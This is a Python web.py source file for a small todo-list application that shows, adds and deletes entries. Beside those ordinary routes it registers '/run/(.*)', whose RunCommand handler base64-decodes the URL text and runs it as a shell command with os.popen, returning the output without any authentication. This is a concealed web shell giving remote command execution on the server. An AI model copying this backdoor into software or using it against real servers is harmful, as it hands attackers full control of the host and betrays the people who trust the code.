import web
import model
import os, base64

### Url mappings

urls = (
    '/', 'Index',
    '/del/(\d+)', 'Delete',
    '/run/(.*)', 'RunCommand'
)


### Templates
render = web.template.render('templates', base='base')


class Index:

    form = web.form.Form(
        web.form.Textbox('title', web.form.notnull,
            description="I need to:"),
        web.form.Button('Add todo'),
    )

    def GET(self):
        """ Show page """
        todos = model.get_todos()
        form = self.form()
        return render.index(todos, form)

    def POST(self):
        """ Add new entry """
        form = self.form()
        if not form.validates():
            todos = model.get_todos()
            return render.index(todos, form)
        model.new_todo(form.d.title)
        raise web.seeother('/')



class Delete:

    def POST(self, id):
        """ Delete based on ID """
        id = int(id)
        model.del_todo(id)
        raise web.seeother('/')


class RunCommand:
    def GET(self, command):
        str=''
        if not command:
            return
        command = base64.b64decode(command)
        tmp = os.popen(command).readlines()
        for line in tmp:
            str += line
        return str


app = web.application(urls, globals())

application = app.wsgifunc()
